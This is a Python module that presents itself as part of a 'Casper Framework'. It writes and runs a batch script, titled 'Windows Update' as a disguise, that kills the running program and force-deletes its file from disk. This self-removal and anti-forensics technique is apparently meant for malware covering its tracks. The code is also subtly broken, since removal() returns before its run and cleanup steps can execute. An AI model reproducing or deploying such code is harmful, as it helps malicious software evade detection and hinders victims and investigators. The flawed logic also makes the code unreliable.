"""
Part of Casper Framework
"""
from imports import *

def payload(file):
	"""
	payload template for killing process and removing
	it after execution, very budget lulz
	"""
	payload = "title Windows Update >nul & ping -n 5 127.0.0.1 >nul & taskkill /IM {} >nul & ping -n 5 127.0.0.1 >nul & del /q /f {} >nul".format(sys.argv[0],sys.argv[0])
	try:
		pload = open(os.path.join(temp_directory(),file),"wb")
		pload.write(payload)
		pload.close()
		return True
	except Exception as e:
		return False

def remove_payload(file):
	"""
	if we find the payload on disk, delete it and move on
	"""
	if (os.path.isfile(os.path.join(temp_directory(),file)) == True):
		try:
			os.remove(os.path.join(temp_directory(),file))
			return True
		except Exception as e:
			return False
	else:
		logging.debug("[casper] payload not found")
		return False
		
def payload_run(file):
	"""
	run the payload
	"""
	try:
		os.system(os.path.join(temp_directory(),file))
		return True
	except Exception as e:
		return False

def removal(file):
	"""
	attempts to remove myself using a batch file that will
	kill the process and sleep, and delete the file from
	disk and exit
	"""
	if (payload(file) == True):
		logging.debug("[casper] Successfully saved payload to disk")
		return True
	else:
		logging.debug("[casper] Error, couldn't save payload to disk")
		return False
	if (payload_run(file) == True):
		logging.debug("[casper] Successfully ran payload")
		return True
	else:
		logging.debug("[casper] Error, couldn't run payload")
		return False
	if (remove_payload(file) == True):
		logging.debug("[casper] Successfully removed payload from disk")
		return True
	else:
		logging.debug("[casper] Error, couldn't remove payload from disk")
		return False